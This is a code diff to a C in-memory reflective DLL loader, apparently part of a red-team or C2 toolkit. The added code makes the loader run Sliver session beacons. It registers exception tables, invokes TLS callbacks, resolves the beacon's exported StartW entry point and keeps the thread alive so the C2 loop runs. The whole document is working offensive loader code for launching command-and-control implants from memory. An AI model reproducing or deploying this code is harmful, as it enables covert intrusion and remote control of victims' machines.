@@ -3,9 +3,11 @@
 #include "memory.h"
 #include "tcg.h"
 
-DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree    ( LPVOID, SIZE_T, DWORD );
+DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$VirtualAlloc         ( LPVOID, SIZE_T, DWORD, DWORD );
+DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualProtect       ( LPVOID, SIZE_T, DWORD, PDWORD );
+DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualFree          ( LPVOID, SIZE_T, DWORD );
+DECLSPEC_IMPORT void     WINAPI KERNEL32$Sleep                ( DWORD );
+DECLSPEC_IMPORT BOOLEAN  WINAPI NTDLL$RtlAddFunctionTable     ( RUNTIME_FUNCTION *, DWORD, DWORD64 );
 
 char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );
 char _MASK_ [ 0 ] __attribute__ ( ( section ( "mask" ) ) );
@@ -132,9 +134,84 @@ void go ( )
     /* now run the DLL */
     DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );
 
+    /*
+     * GetDataDirectory reads from dll_data->OptionalHeader which points into
+     * dll_src (the raw PE buffer).  LoadSections only maps sections into
+     * dll_dst — the PE header area (offset 0..SizeOfHeaders-1) in dll_dst
+     * is all zeros after VirtualAlloc.  Reading dll_dst->e_lfanew etc.
+     * would give zero and break every data-directory lookup.  Always use
+     * GetDataDirectory() here instead.
+     *
+     * Exception table (.pdata): register before DllMain so Go's morestack
+     * and async-preemption paths can call RtlLookupFunctionEntry on beacon
+     * addresses.  Use NTDLL$ — ntdll always exports RtlAddFunctionTable.
+     */
+    {
+        IMAGE_DATA_DIRECTORY * exc = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_EXCEPTION );
+        if ( exc->VirtualAddress && exc->Size ) {
+            RUNTIME_FUNCTION * rf    = ( RUNTIME_FUNCTION * ) ( dll_dst + exc->VirtualAddress );
+            DWORD              count = exc->Size / sizeof ( RUNTIME_FUNCTION );
+            NTDLL$RtlAddFunctionTable ( rf, count, ( DWORD64 ) dll_dst );
+        }
+
+        /* TLS callbacks: call DLL_PROCESS_ATTACH before DllMain.
+         * Callback[0] is CRT static init (_initterm); read the directory
+         * from dll_dst (it's in a mapped section), but get the RVA from
+         * GetDataDirectory (not from the zero-filled header area). */
+        IMAGE_DATA_DIRECTORY * tls_dir = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_TLS );
+        if ( tls_dir->VirtualAddress ) {
+            IMAGE_TLS_DIRECTORY64 * tls     = ( IMAGE_TLS_DIRECTORY64 * ) ( dll_dst + tls_dir->VirtualAddress );
+            PIMAGE_TLS_CALLBACK   * cb_list = ( PIMAGE_TLS_CALLBACK * ) ( ULONG_PTR ) tls->AddressOfCallBacks;
+            if ( cb_list ) {
+                for ( PIMAGE_TLS_CALLBACK * cb = cb_list; *cb; cb++ ) {
+                    ( *cb ) ( ( PVOID ) dll_dst, DLL_PROCESS_ATTACH, NULL );
+                }
+            }
+        }
+    }
+
+    /*
+     * Save export RVA now, before VirtualFree(dll_src).
+     * GetDataDirectory returns a pointer into dll_src; after VirtualFree
+     * that pointer is dangling.  The export directory DATA itself is in a
+     * mapped section (dll_dst), so we only need the RVA saved here.
+     */
+    DWORD export_rva = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_EXPORT )->VirtualAddress;
+
     /* free the unmasked copy */
     KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );
 
     entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
-    entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, NULL );
+
+    /*
+     * Sliver session beacons export StartW as the explicit C2-loop entry
+     * point.  Walk the export table (data lives in dll_dst sections) and
+     * call it directly.  export_rva was captured above before dll_src was
+     * freed.
+     */
+    typedef void ( * STARTW_FUNC ) ( void );
+
+    if ( export_rva != 0 )
+    {
+        IMAGE_EXPORT_DIRECTORY * exp = ( IMAGE_EXPORT_DIRECTORY * ) ( dll_dst + export_rva );
+        DWORD * names     = ( DWORD * ) ( dll_dst + exp->AddressOfNames );
+        WORD  * ordinals  = ( WORD  * ) ( dll_dst + exp->AddressOfNameOrdinals );
+        DWORD * functions = ( DWORD * ) ( dll_dst + exp->AddressOfFunctions );
+
+        for ( DWORD i = 0; i < exp->NumberOfNames; i++ )
+        {
+            char * name = ( char * ) ( dll_dst + names [ i ] );
+
+            if ( name[0]=='S' && name[1]=='t' && name[2]=='a' && name[3]=='r' &&
+                 name[4]=='t' && name[5]=='W' && name[6]=='\0' )
+            {
+                ( ( STARTW_FUNC ) ( dll_dst + functions [ ordinals [ i ] ] ) ) ( );
+                break;
+            }
+        }
+    }
+
+    /* StartW returns immediately after spawning the beacon goroutine.
+     * Keep this thread alive so the Go scheduler can run the beacon. */
+    KERNEL32$Sleep ( 0xFFFFFFFF );
 }
